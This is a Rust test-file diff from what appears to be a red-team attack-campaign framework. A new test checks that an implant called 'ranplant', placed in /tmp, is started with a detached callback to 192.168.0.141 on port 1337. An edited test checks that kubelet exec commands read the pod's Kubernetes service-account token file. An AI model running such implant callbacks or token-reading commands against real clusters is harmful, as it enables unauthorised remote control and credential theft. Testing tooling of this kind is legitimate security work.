@@ -3048,6 +3048,53 @@ fn prepare_action_grounds_binary_against_target_for_direct_path() {
 }
 
 #[test]
+fn prepare_action_grounds_binary_on_direct_callback_system() {
+    use ran_domain::UnknownSystem;
+
+    let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
+
+    let mut target = UnknownSystem::new("agent-worker");
+    target.system.sessions.push(SessionInfo {
+        id: "c2-ran-1337".to_string(),
+        kind: "tcp".to_string(),
+        port: Some(1337),
+        status: SessionStatus::Active,
+    });
+    target.system.set_binary("ranplant", "/tmp/ranplant");
+    let target_id = target.entity_id();
+    campaign.insert_entity(&target);
+
+    let armory = Armory::from_ttps(vec![Ttp {
+        procedures: vec![Procedure {
+            tool: Some("ranplant".to_string()),
+            operation: ProcedureOperation::StartRanplantSession {
+                listener_port: "1337".to_string(),
+            },
+            ..Procedure::new(
+                "native",
+                "ranplant connect --host 192.168.0.141 --port 1337 --detach",
+            )
+        }],
+        ..Ttp::new("test-ttp", "Start Ranplant Session", "Execution")
+    }]);
+    let exec = campaign
+        .prepare_action(action_request(&target_id.0, None), &armory)
+        .expect("callback system should prepare through its active session");
+
+    assert_eq!(
+        exec.procedure.command,
+        "/tmp/ranplant connect --host 192.168.0.141 --port 1337 --detach"
+    );
+    assert!(matches!(
+        exec.operation,
+        ExecutionOperation::StartRanplantSession {
+            ref command,
+            listener_port: 1337,
+        } if command == "/tmp/ranplant connect --host 192.168.0.141 --port 1337 --detach"
+    ));
+}
+
+#[test]
 fn execute_in_shell_grounds_the_submitted_command_directly() {
     let mut campaign = Campaign::bootstrap("Ran", K8sCluster::new("dev"));
 
@@ -3386,7 +3433,7 @@ fn prepare_action_builds_kubelet_sink_command_when_outer_envelope_missing() {
     campaign.entities.insert_typed(target);
 
     // Historical edge shape: kubelet source relation exists but carries no
-    // envelope metadata (e.g. from drop-ran-ws marker expansion).
+    // envelope metadata (e.g. from an older install marker expansion).
     push_relation(
         &mut campaign,
         &ran_domain::KubeletExecSource::new(&attacker_id, &node_id),
@@ -3415,15 +3462,17 @@ fn prepare_action_builds_kubelet_sink_command_when_outer_envelope_missing() {
         .expect("should build kubelet sink fallback command");
 
     assert!(
-        exec.procedure.command.contains("ran-ws --url"),
-        "expected ran-ws direct kubelet command, got: {}",
+        exec.procedure
+            .command
+            .contains("ranplant kubelet-exec --url"),
+        "expected Ranplant direct kubelet command, got: {}",
         exec.procedure.command
     );
     assert!(
         exec.procedure
             .command
-            .contains("--token \"$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\""),
-        "expected fallback ran-ws token sourcing from pod SA token, got: {}",
+            .contains("--token-file /var/run/secrets/kubernetes.io/serviceaccount/token"),
+        "expected Ranplant to read the mounted pod service-account token, got: {}",
         exec.procedure.command
     );
     assert!(
